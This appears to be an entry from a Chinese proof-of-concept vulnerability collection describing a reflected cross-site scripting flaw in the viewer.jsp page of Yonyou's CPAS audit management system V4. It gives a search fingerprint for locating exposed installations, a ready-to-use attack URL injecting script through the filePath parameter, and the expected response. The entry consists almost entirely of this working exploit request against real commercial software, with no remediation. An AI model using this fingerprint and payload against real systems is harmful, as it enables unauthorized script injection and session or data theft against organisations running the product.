# 用友友数聚科技CPAS审计管理系统V4viewer.jsp存在XSS漏洞

用友 ｜ XSS ｜ —
- **指纹**：`body="/cpasm4/static/cap/font/iconfont.css"`
- **请求**：`http://ip/cpasm4/views/aco/pdf/web/viewer.jsp?filePath=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E`
- **响应特征**：200